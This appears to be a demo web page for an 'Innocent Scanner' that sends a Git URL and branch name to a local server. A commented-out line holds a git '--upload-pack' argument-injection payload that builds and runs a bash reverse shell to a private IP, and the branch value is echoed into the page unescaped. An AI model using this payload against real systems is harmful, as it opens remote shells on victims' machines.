<!DOCTYPE html>
<html lang="en">
<meta charset="UTF-8">
<title>Workspace Demo</title>
<!-- Latest compiled and minified CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="">
<style>
</style>
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js">  </script>
<script>
    $(document).ready(function(){
      $("#githubUrl").val("https://github.com/defunctzombie/node-url");
      // $("#githubBranch").val("--upload-pack=rm -f ./code.sh;echo '#!/bin/bash\nsh > /dev/tcp/192.168.60.128/4444 0>&1;' >> ./code.sh;chmod 777 ./code.sh;./code.sh");
      // $("#githubBranch").val("--upload-pack=touch demo;");
      let githubUrl,githubBranch;
      $("#submit").click(function(){
        // e.preventDefault();
        githubUrl=$("#githubUrl").val();
        githubBranch=$("#githubBranch").val();
        $.post("http://192.168.0.165:3000/github-data",{githubUrl: githubUrl,githubBranch: githubBranch}, function(data){
          // if(data.status === '200') {
            $('.alert-container').empty();
            $('.alert-container').append(
              '<div class="alert alert-success alert-dismissible fade show" role="alert">'
              +'<span>your git repo with branch <code>'+ githubBranch +'</code> is scanning.</span>'
              + '<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>'
              + '</div>'
            )
          // }

        });
      });
    });
  </script>
<body>


<div class="">
  <div class="row" style="display:flex;justify-content:center">
    <!--Grid column-->
    <div class="col-md-6" style="margin-top:150px">
      <div class="alert-container"></div>
      <h1>Innocent Scanner </h1>

      <h3>An internal dev scanner that checks your code quality.</h3>
        
      <div>
        <div class="form-group">
          <label for="exampleInputEmail1">Git Url</label>
          <input id="githubUrl" type="url" class="form-control mt-2" placeholder="Enter url">          
        </div>
        <div class="form-group mt-2">
          <label for="exampleInputPassword1">Remote Branch</label>
          <input id="githubBranch" type="text" class="form-control mt-2" id="exampleInputPassword1" placeholder="Branch name">
        </div>
        <button id="submit" type="submit" class="btn btn-primary mt-2">Scan</button>
      </div>
  
    </div>
    <!--Grid column-->
  
  </div>

</div>

</body>
</html>